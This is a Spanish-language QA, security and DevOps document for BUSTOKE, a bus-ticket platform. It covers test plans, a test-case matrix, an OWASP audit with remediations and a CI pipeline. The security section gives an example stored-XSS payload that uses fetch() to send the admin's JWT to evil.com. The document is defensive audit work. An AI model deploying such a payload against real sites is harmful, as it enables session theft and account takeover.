# BUSTOKE — Documento de QA, Seguridad y DevOps

> Versión consolidada · 2026-07-08 · ISTQB CTFL · OWASP Top 10 2021 · ISO/IEC 29119

---

## 1. Introducción y Alcance del Sistema BUSTOKE

### 1.1. Visión general

**BUSTOKE** es una plataforma de **venta y operación de pasajes de transporte interprovincial** que conecta:

- **Pasajeros (B2C)**: compran boletos en línea, seleccionan asientos y gestionan sus viajes.
- **Agencias de transporte (B2B)**: operan buses, rutas, tarifas y atienden reclamos.
- **Operadores en counter**: validan boletos con QR en el embarque.

Es un **monorepo** con tres componentes:

| Carpeta | Stack | Rol |
|---|---|---|
| `backend/` | Python 3.11 · FastAPI · SQLAlchemy 2 · PostgreSQL · JWT | API REST `/v1/*` |
| `frontend-client/` | React 19 · Vite · TailwindCSS 4 · Axios | SPA del pasajero |
| `bustoke_bd.sql` | PostgreSQL | Esquema canónico de la base de datos |

### 1.2. Módulos principales del Backend

| Router | Endpoints clave | RF |
|---|---|---|
| **Auth** | `/auth/register`, `/auth/login`, `/auth/refresh`, `/auth/me` | RF-01, RF-02 |
| **Travels** | `/travels/search`, `/travels/{id}`, `/travels/{id}/seats` | RF-03, RF-04, RF-05, RF-11 |
| **Seats** | `/seats/hold`, `/seats/release`, `/seats/release-sync` | RF-05, RF-07, RF-08 |
| **Bookings** | `/bookings/process` (transacción atómica) | RF-07 |
| **Boletos** | `/boletos/validar/{qr}`, `/boletos/historial` | RF-07, RF-11, RF-21 |
| **Claims** | `/claims/`, `/claims/me`, `/claims/{id}/messages`, `/claims/{id}/respond` | RF-09, RF-10, RF-19 |
| **Payments** | Integración Mercado Pago (Card Payment Brick) | RF-07 |
| **Agencies (B2B)** | Stubs | RF-12 a RF-21, RF-25 |
| **Billing** | Stubs | RF-22 a RF-25 |

### 1.3. Módulos del Frontend

| Pantalla | Componente | Endpoint |
|---|---|---|
| Landing + búsqueda | `LandingPage`, `SearchBar` | (estático) |
| Resultados | `ResultsPage`, `BusCard*` | `/v1/travels/search` |
| Selección de asientos | `SeatSelectionPage` (multi-piso) | `/v1/travels/{id}/seats` |
| Checkout | `CheckoutPage` | `/v1/bookings/process` |
| Auth | `LoginPage`, `RegisterPage` | `/v1/auth/*` |
| Mis viajes | `HistoryPage` | `/v1/boletos/historial` |
| Reclamos | `ClaimsPage` | `/v1/claims/*` |

### 1.4. Características transversales

- Token por pestaña (`sessionStorage.bustoke_seat_session_token`) anti-colisión de holds.
- Interceptor Axios con refresh automático de JWT.
- Job en background `hold_cleanup_loop` en el lifespan (cada 5 min).
- Rate limiting con `slowapi` (3/hora register, 5/min login).
- Security headers (CSP, HSTS, X-Frame-Options, Permissions-Policy).
- Validación de entropía de `SECRET_KEY` ≥ 256 bits en producción.

---

## 2. Plan y Estrategia de Pruebas (ISTQB / ISO 29119)

### 2.1. Marco normativo

| Estándar | Aplicación |
|---|---|
| **ISTQB CTFL** | Partición de equivalencia, análisis de valores límite, tablas de decisión, pruebas basadas en riesgos, cobertura de sentencias y decisiones. |
| **ISO/IEC 29119-2** | Proceso de prueba: especificación con ID único, precondiciones, datos de entrada, pasos, resultados esperados. |
| **ISO/IEC 29119-3** | Documentación por técnica (EP, BVA, white-box) y trazabilidad a RF. |
| **ISO/IEC 25010** | Seguridad (OWASP) y fiabilidad (atomicidad, idempotencia, race conditions). |

### 2.2. Pirámide de pruebas

```
        ▲
       ╱ ╲
      ╱ E2╲          Cypress (9 specs) · frontend ↔ backend
     ╱─────╲
    ╱  API  ╲       pytest + TestClient (118 tests) · DB transaccional
   ╱────────╲
  ╱ (Unit)   ╲    (futuro) pytest para utils puras
 ╱─────────────╲
```

### 2.3. Justificación API > E2E (basada en riesgo)

| Módulo | Probabilidad | Impacto | Riesgo | Cobertura priorizada |
|---|---|---|---|---|
| **Bookings / Pagos** | Alta | Crítico | 🔴 Extremo | API + E2E + Concurrencia |
| **Seats / Hold** | Alta | Alto | 🔴 Extremo | API + Concurrencia |
| **Boletos / Validar QR** | Media | Alto | 🟠 Alto | API + Concurrencia |
| **Auth** | Media | Alto | 🟠 Alto | API + Seguridad |
| **Claims** | Baja | Medio | 🟡 Medio | API (reglas) |
| **Travels / Search** | Baja | Bajo | 🟢 Bajo | API (boundary) |
| **Frontend UI** | Media | Medio | 🟡 Medio | E2E (smoke) |

**Por qué API > E2E para riesgos extremos:**

1. **Velocidad**: 118 tests API en ~100s vs ~3-5 min de E2E.
2. **Determinismo**: SQLite in-memory + transacción con rollback = 0% flaky.
3. **Race conditions**: `concurrent.futures.ThreadPoolExecutor` solo viable sobre HTTP local.
4. **Acceso al estado interno**: API puede leer `bloqueos_temporales` y `vw_estado_asientos_viaje`.
5. **Costo de mantenimiento**: selectores E2E (`aria-label`) sobreviven a refactors, pero cambios en el modelo rompen 1 test API, no 5.

**E2E se mantiene** como smoke test del happy path (9 specs) — no intenta replicar race conditions o seguridad.

### 2.4. Trazabilidad RF → Casos

| RF | Cobertura API | Cobertura E2E |
|---|---|---|
| RF-01 Registro | TC-BB-001..005 + test_auth_api | — |
| RF-02 Login + Guest | TC-BB-006/007 + TC-BB-019 + test_auth_api | 01, 02, 03 |
| RF-03 Búsqueda | TC-BB-009..012 + test_travels_api | 01, 03 |
| RF-05 Hold asientos | TC-BB-013..016 + TC-RB-001 + TC-RB-003 | 02, 03 |
| RF-07 Checkout | TC-BB-017..019 + TC-RB-002 | 03 |
| RF-09/10 Reclamos | TC-BB-030/031 + test_claims_api | — |
| RF-11 Validar QR | TC-BB-027..029 + TC-RB-005 | — |
| OWASP A02/A05/A07 | test_security_api | — |

---

## 3. Matriz de Casos de Prueba

> 45 casos totales: 31 Caja Negra + 9 Caja Blanca + 5 Basada en Riesgo.
> Trazabilidad ISTQB CTFL e ISO/IEC 29119-3.

### 3.1. Caja Negra (TC-BB-001 a TC-BB-031)

| ID | Módulo | Tipo | Descripción | Resultado esperado |
|---|---|---|---|---|
| TC-BB-001 | `POST /v1/auth/register` | Partición (válida) | Registro con todos los campos válidos | 201, access_token + refresh_token |
| TC-BB-002 | `POST /v1/auth/register` | Partición (email inválido) | Email mal formado | 422 "value is not a valid email address" |
| TC-BB-003 | `POST /v1/auth/register` | Valor límite | Contraseña de 8 caracteres (límite inferior) | 201 (acepta) |
| TC-BB-004 | `POST /v1/auth/register` | Valor límite | Contraseña de 7 caracteres (bajo límite) | 422 "ensure this value has at least 8 characters" |
| TC-BB-005 | `POST /v1/auth/register` | Partición (duplicado) | Email ya registrado (case-insensitive) | 409 "El correo electrónico ya está registrado" |
| TC-BB-006 | `POST /v1/auth/login` | Partición (válida) | Credenciales correctas | 200, tokens en localStorage |
| TC-BB-007 | `POST /v1/auth/login` | Partición (inválida) | Password incorrecto | 401 "Credenciales inválidas" |
| TC-BB-008 | `GET /v1/auth/me` | Token expirado | Llamada con JWT expirado | 401, refresh automático vía interceptor |
| TC-BB-009 | `GET /v1/travels/search` | Valor límite (fecha) | Fecha anterior a hoy | 400 "La fecha de salida no puede ser anterior a hoy" |
| TC-BB-010 | `GET /v1/travels/search` | Valor límite (fecha) | Fecha a +91 días | 400 "no puede ser posterior a" |
| TC-BB-011 | `GET /v1/travels/search` | Partición | Origen == destino | 400 "El origen y el destino deben ser distintos" |
| TC-BB-012 | `GET /v1/travels/search` | Partición | Rango invertido (max < min) | 400 "precio_max debe ser mayor o igual a precio_min" |
| TC-BB-013 | `POST /v1/seats/hold` | Partición (válida) | Hold de asiento libre | 201, `estado="activo"`, savepoint anti-race |
| TC-BB-014 | `POST /v1/seats/hold` | Partición (ocupado) | Hold de asiento con boleto activo | 409 "El asiento ya está ocupado por un boleto activo" |
| TC-BB-015 | `POST /v1/seats/hold` | Partición (otro user) | Hold ya bloqueado por otro token | 409 "El asiento ya está bloqueado por otro usuario" |
| TC-BB-016 | `POST /v1/seats/hold` | Partición (bloq. manual) | `bloqueado_manual=true` | 409 "El asiento está deshabilitado por el administrador" |
| TC-BB-017 | `POST /v1/bookings/process` | Partición | Sin aceptar términos | 409 "Debes aceptar los términos y políticas" |
| TC-BB-018 | `POST /v1/bookings/process` | Partición | Sin hold vigente | 409 "Algunos asientos no tienen un bloqueo activo" |
| TC-BB-019 | `POST /v1/bookings/process` | Guest | Sin Authorization header | 201, `id_usuario=NULL`, `email_contacto` |
| TC-BB-020 | `LocalCardPaymentForm` | Luhn válido | Visa 16 dígitos | Marca detectada, no error |
| TC-BB-021 | `LocalCardPaymentForm` | Luhn inválido | Checksum incorrecto | Error "Número de tarjeta inválido" |
| TC-BB-022 | `LocalCardPaymentForm` | Valor límite (CVV) | 2 dígitos | Error "CVV inválido" |
| TC-BB-023 | `LocalCardPaymentForm` | Valor límite (CVV) | 3 dígitos | Aceptado |
| TC-BB-024 | `LocalCardPaymentForm` | Valor límite (CVV) | 4 dígitos (Amex) | Aceptado |
| TC-BB-025 | `LocalCardPaymentForm` | Valor límite (venc.) | Fecha ya vencida | Error "Tarjeta vencida" |
| TC-BB-026 | `LocalCardPaymentForm` | Valor límite (venc.) | Mes 13 | Error "Mes inválido" |
| TC-BB-027 | `GET /v1/boletos/validar/{qr}` | Partición (válido) | Boleto activo, dentro de ventana | 200, valido=true, "BIENVENIDO" |
| TC-BB-028 | `GET /v1/boletos/validar/{qr}` | Ya usado | Boleto con `usado=true` | 200, valido=false, "ya utilizado" |
| TC-BB-029 | `GET /v1/boletos/validar/{qr}` | No existe | QR inexistente | 404 "Boleto no encontrado" |
| TC-BB-030 | `POST /v1/claims/` | Partición (válida) | Reclamo autenticado, detalle ≥ 15 chars | 201, estado="abierto" |
| TC-BB-031 | `POST /v1/claims/` | Valor límite | detalle de 14 chars | 422 (frontend muestra error de 15 antes) |

### 3.2. Caja Blanca (TC-WB-001 a TC-WB-009)

| ID | Función | Bifurcación | Caso |
|---|---|---|---|
| TC-WB-001 | `splitFullName` | Rama 0 tokens | `""` y `"   "` → 3 campos vacíos |
| TC-WB-002 | `splitFullName` | Rama 1 token | `"Juan"` → 422 backend por apellido vacío |
| TC-WB-003 | `splitFullName` | Rama 2 tokens | `"Juan Pérez"` |
| TC-WB-004 | `splitFullName` | Rama 3+ tokens | `"Juan Carlos Pérez Mendoza"` |
| TC-WB-005 | `luhnValid` | Bucle completo | 13 dígitos checksum válido |
| TC-WB-006 | `luhnValid` | Early return | < 13 dígitos |
| TC-WB-007 | `validateCheckoutForm` | `buyerIsPax1=true` | fullName vacío (cortocircuito) |
| TC-WB-008 | `validateCheckoutForm` | `buyerIsPax1=false` | fullName vacío (error agregado) |
| TC-WB-009 | `handlePay` | Rama `localPaymentId` | Mock form submit salta `/payments/create` |

### 3.3. Basada en Riesgo (TC-RB-001 a TC-RB-005)

| ID | Módulo | Riesgo crítico | Mitigación verificada |
|---|---|---|---|
| TC-RB-001 | `POST /v1/seats/hold` | Doble venta (race) | UNIQUE parcial + savepoint |
| TC-RB-002 | `POST /v1/bookings/process` | Pérdida de plata (cobro duplicado) | Idempotencia por `mp_payment_id` (referencia_transaccion) |
| TC-RB-003 | `POST /v1/seats/hold` | Holds zombie | `releaseHoldsBeacon` + `hold_cleanup_loop` cada 5 min |
| TC-RB-004 | `POST /v1/auth/refresh` | Loop infinito de refresh | Flag `isRefreshing` + `_retry` previenen reintentos |
| TC-RB-005 | `GET /v1/boletos/validar/{qr}` | Doble embarque concurrente | `SELECT ... FOR UPDATE` serializa transacciones |

---

## 4. Análisis de Seguridad (OWASP Top 10)

### 4.1. Resumen de hallazgos

| # | Severidad | Riesgo | OWASP | Estado |
|---|---|---|---|---|
| 1 | 🔴 Crítica | Sin rate limiting en autenticación | A07 | ✅ Mitigado |
| 2 | 🔴 Crítica | JWT en `localStorage` (XSS) | A02/A03 | ⚠️ Mitigación parcial + roadmap |
| 3 | 🟠 Alta | `SECRET_KEY` con validación insuficiente | A02 | ✅ Mitigado |
| 4 | 🟠 Alta | Sin headers de seguridad HTTP | A05 | ✅ Mitigado |
| 5 | 🟡 Media | Enumeración de emails en `/register` | A07 | 🛠 Pendiente |
| 6 | 🟡 Media | `bcrypt` trunca a 72 bytes | A02 | 🛠 Pendiente |
| 7 | 🟡 Media | CORS permite `localhost` en prod | A05 | 🛠 Pendiente |
| 8 | 🟢 Baja | `APP_DEBUG=True` por default | A05 | 🛠 Pendiente |
| 9 | 🟢 Baja | Sin endpoint de logout | A07 | 🛠 Pendiente |

### 4.2. Detalle de los 4 hallazgos críticos corregidos

#### #1 — A07: Sin Rate Limiting en Autenticación

**Vector de ataque**: 1000 requests con `rockyou.txt` en ~10 minutos contra `/login`.

**Remediación** (`app/api/v1/routes/auth.py` + middleware en `main.py`):
```python
limiter = Limiter(key_func=get_remote_address, default_limits=["60/minute"])
app.add_middleware(SlowAPIMiddleware)

@router.post("/login")
@limiter.limit("5/minute")       # anti-brute-force
async def login(request: Request, payload: LoginRequest, ...): ...

@router.post("/register")
@limiter.limit("3/hour")        # anti-spam
async def register_user(request: Request, payload: RegisterSchema, ...): ...

@router.post("/refresh")
@limiter.limit("30/minute")     # renovación legítima
async def refresh_token(request: Request, payload: RefreshRequest, ...): ...
```

`RATE_LIMIT_ENABLED=false` en pytest para no romper la suite.

#### #2 — A02/A03: JWT en `localStorage` (XSS)

**Vector de ataque**: pasajero crea reclamo con `motivo = <img src=x onerror="fetch('https://evil.com?t='+localStorage.getItem('access'))">`. Cuando admin abre `ClaimsPage`, se ejecuta el handler y exfiltra su token.

**Remediación parcial aplicada**:
- **CSP estricto** (`security_headers.py`): `script-src 'self'` (NO `unsafe-inline`).
- **Sanitización defensiva** (`utils/sanitize.js`): `escapeHtml` en todos los campos de texto libre renderizados.
- **Migración a `httpOnly` cookies** (roadmap Q3 2026): eliminar `localStorage` por completo.

#### #3 — A02: `SECRET_KEY` con validación insuficiente

**Vector de ataque**: secretos como `bustoke_clave_secreta_26262626` (en `rockyou.txt`) pasaban la validación de longitud pero son bruteforceables.

**Remediación** (`app/core/config.py`):
```python
MIN_SECRET_KEY_BITS = 256

def _shannon_entropy_bits(value: str) -> float:
    freq = {}
    for ch in value:
        freq[ch] = freq.get(ch, 0) + 1
    length = len(value)
    entropy = 0.0
    for count in freq.values():
        p = count / length
        entropy -= p * math.log2(p)
    return entropy * length

@model_validator(mode="after")
def _validate_production_secrets(self):
    if self.APP_ENV == "production":
        if self.SECRET_KEY == "change_me_in_production":
            raise ValueError(...)
        if len(self.SECRET_KEY) < 32:
            raise ValueError(f"SECRET_KEY demasiado corto ({len(self.SECRET_KEY)} chars). Mínimo 32.")
        entropy = _shannon_entropy_bits(self.SECRET_KEY)
        if entropy < MIN_SECRET_KEY_BITS:
            raise ValueError(f"SECRET_KEY tiene entropía insuficiente ({entropy:.1f} bits < 256).")
```

Comando de generación recomendado:
```bash
python -c "import secrets; print(secrets.token_urlsafe(64))"
```

#### #4 — A05: Headers de seguridad HTTP faltantes

**Remediación** (`app/core/security_headers.py` + middleware en `main.py`):
```python
class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers.setdefault("X-Frame-Options", "DENY")
        response.headers.setdefault("X-Content-Type-Options", "nosniff")
        response.headers.setdefault("Referrer-Policy", "strict-origin-when-cross-origin")
        response.headers.setdefault("Permissions-Policy",
            "geolocation=(), microphone=(), camera=(), payment=()")
        if request.url.scheme == "https":
            response.headers.setdefault("Strict-Transport-Security",
                "max-age=31536000; includeSubDomains; preload")
        response.headers.setdefault("Content-Security-Policy", DEFAULT_CSP)
        return response
```

Verificación con `curl -I https://bustoke.com/health` debe mostrar los 6 headers.

### 4.3. Verificación end-to-end

```bash
# 1. Rate limit funcional
for i in {1..6}; do curl -X POST https://bustoke.com/v1/auth/login -d '{"email":"x@x.com","password":"x"}' -H "Content-Type: application/json"; done
# Primeras 5 → 401; 6ª → 429

# 2. Headers presentes
curl -I https://bustoke.com/health

# 3. SECRET_KEY válido
APP_ENV=production SECRET_KEY=$(python -c "import secrets; print(secrets.token_urlsafe(64))") \
  python -c "from app.core.config import settings; print(settings.secret_key_source)"
# → ok

# 4. SECRET_KEY débil rechazado
APP_ENV=production SECRET_KEY=short python -c "from app.core.config import settings"
# → ValueError
```

---

## 5. Flujo DevOps (CI/CD)

### 5.1. Diagrama de flujo

```
DESARROLLADOR
   │  git push feature/X
   ▼
PULL REQUEST → develop (o main)
   │  GitHub UI dispara workflows
   ▼
FASE 1 — BARRERAS EN PARALELO
   │
   ├──► backend-tests  (pytest 118 tests, ~100s)
   │         │
   │         ▼ (si pasa)
   ├──► e2e-tests      (Cypress + PostgreSQL + uvicorn + Vite, ~3-5 min)
   │
   └──► frontend-lint  (ESLint, ~5s)
   │
   ▼
FASE 2 — REQUISITOS PARA MERGE
   │
   ├──► ✅ backend-tests passed
   ├──► ✅ e2e-tests passed
   ├──► ✅ frontend-lint passed
   ├──► ✅ Code review (1-2 aprobaciones)
   ├──► ✅ Branch up-to-date
   └──► ✅ Secretos sin leaks (gitleaks)
   │
   ▼
MERGE → develop → main
   │
   ▼
DEPLOY AUTOMÁTICO
   ├──► Render.com (backend)
   └──► Vercel (frontend)
```

### 5.2. Workflow YAML (`.github/workflows/test-automation.yml`)

```yaml
name: Test Automation

on:
  push:
    branches: [main, develop]
    paths: ['backend/**', 'frontend-client/**', '.github/workflows/test-automation.yml']
  pull_request:
    branches: [main, develop]

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

env:
  PYTHON_VERSION: '3.11'
  NODE_VERSION: '20'
  CYPRESS_API_URL: http://localhost:8000/v1
  CYPRESS_BASE_URL: http://localhost:5173

jobs:
  backend-tests:
    name: Backend API Tests (pytest)
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.11', cache: 'pip', cache-dependency-path: backend/requirements.txt }
      - working-directory: backend
        run: |
          python -m venv venv && source venv/bin/activate
          pip install -r requirements.txt
          pytest tests/ --junitxml=reports/pytest-junit.xml --tb=short -v -ra
      - uses: actions/upload-artifact@v4
        if: always()
        with: { name: backend-pytest-report, path: backend/reports/, retention-days: 7 }

  e2e-tests:
    name: E2E Tests (Cypress)
    runs-on: ubuntu-latest
    timeout-minutes: 20
    needs: backend-tests
    services:
      postgres:
        image: postgres:16-alpine
        env: { POSTGRES_USER: postgres, POSTGRES_PASSWORD: postgres, POSTGRES_DB: bustoke_test }
        ports: ['5432:5432']
        options: --health-cmd "pg_isready -U postgres" --health-interval 5s --health-timeout 5s --health-retries 10
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.11' }
      - uses: actions/setup-node@v4
        with: { node-version: '20' }
      - working-directory: backend
        run: pip install -r requirements.txt
      - working-directory: frontend-client
        run: npm ci
      - run: PGPASSWORD=postgres psql -h localhost -U postgres -d bustoke_test -f backend/scripts/bustoke_bd.sql
      - run: nohup uvicorn app.main:app --host 127.0.0.1 --port 8000 > backend.log 2>&1 &
      - run: nohup npm run dev -- --host 127.0.0.1 --port 5173 > vite.log 2>&1 &
      - working-directory: frontend-client
        run: npm run cy:run:headless

  frontend-lint:
    name: Frontend Lint (ESLint)
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20' }
      - working-directory: frontend-client
        run: npm ci && npm run lint
```

### 5.3. Branch protection (configurar en GitHub UI)

#### Reglas para `main`:
- ☑ Require pull request (2 aprobaciones)
- ☑ Require signed commits
- ☑ Require linear history
- ☑ Require status checks: `backend-tests`, `e2e-tests`, `frontend-lint`
- ☑ Require conversation resolution
- ☑ Include administrators
- ❌ Never allow force pushes
- ❌ Never allow deletions

#### Reglas para `develop`:
- ☑ Require pull request (1 aprobación)
- ☑ Require status checks: `backend-tests`, `frontend-lint` (e2e opcional)
- ☑ Include administrators
- ❌ Never allow force pushes

### 5.4. Workflows pendientes

| Workflow | Propósito | Estado |
|---|---|---|
| `security.yml` | Gitleaks + CodeQL (Python + JavaScript) | 🛠 Pendiente |
| `deploy.yml` | Render (backend) + Vercel (frontend) | 🛠 Pendiente |
| `dependencies.yml` | `pip-audit` + `npm audit` semanal | 🛠 Pendiente |

---

## 6. Conclusiones, Riesgos Residuales y Roadmap

### 6.1. Logros del proyecto

- **Plataforma funcional end-to-end** (backend FastAPI + frontend React).
- **118 tests automatizados** verde en ~100s.
- **Pipeline CI/CD** definido con 3 jobs paralelos + artefactos.
- **Auditoría de seguridad OWASP** completa: 3 hallazgos críticos mitigados.
- **4 discrepancias del TEST_PLAN resueltas** (detalle ≥ 15, typo TEST_PLAN, idempotencia MP, job de holds).
- **Modelo de datos maduro** (25+ entidades, vistas SQL, enums, índices únicos parciales).
- **Documentación completa** (README, TESTING, TEST_PLAN, SECURITY, SECURITY_AUDIT).

### 6.2. Riesgos residuales

| # | Riesgo | Severidad | Mitigación actual |
|---|---|---|---|
| R1 | Branch protection NO configurado en GitHub UI | 🔴 Crítica | Acción manual urgente |
| R2 | JWT en `localStorage` (vector XSS residual) | 🔴 Crítica | CSP + sanitización; httpOnly cookies en Q3 |
| R3 | Render free tier duerme tras 15 min (cold start 60s) | 🟠 Alta | Timeouts en `cy.verificarAPI()` |
| R4 | Webhook de Mercado Pago no implementado | 🟠 Alta | Idempotencia en backend cubre reintentos del cliente |
| R5 | Sin `pip-audit` / `npm audit` en CI | 🟠 Alta | Pendiente |
| R6 | Email enumeration en `/register` | 🟡 Media | Pendiente |
| R7 | bcrypt trunca contraseñas a 72 bytes | 🟡 Media | Pendiente (argon2) |
| R8 | Sin observability/alerting (Datadog/Sentry) | 🟡 Media | Pendiente |
| R9 | Sin 2FA para admins de agencia | 🟡 Media | Q4 2026 |
| R10 | Sin suite de carga (`k6`/`locust`) | 🟢 Baja | Pendiente |

### 6.3. Roadmap

**Q3 2026 (inmediato)**
1. Configurar branch protection en GitHub UI (R1) — 30 min.
2. Workflows de seguridad: CodeQL + Gitleaks + audit (R5) — 1 día.
3. Migrar JWT a cookies `httpOnly` + CSRF (R2) — 1 sprint.
4. Webhook de Mercado Pago (R4) — 2 días.
5. Rotar `SECRET_KEY` actual a ≥ 256 bits de entropía.
6. Endpoint `POST /v1/auth/logout` con blacklist.

**Q4 2026**
- 2FA (TOTP) para admins de agencia.
- Observability: Datadog/Sentry con alertas.
- Migración `bcrypt` → `argon2-cffi` con rehash progresivo.
- Tests de carga sobre `/v1/travels/search`.
- Auditoría externa de seguridad.

**2027**
- Endpoints B2B (Agencies + Billing) — actualmente stubs.
- Frontend-agency (panel admin).
- Notificaciones push.
- Procedure de backup/restore documentado.

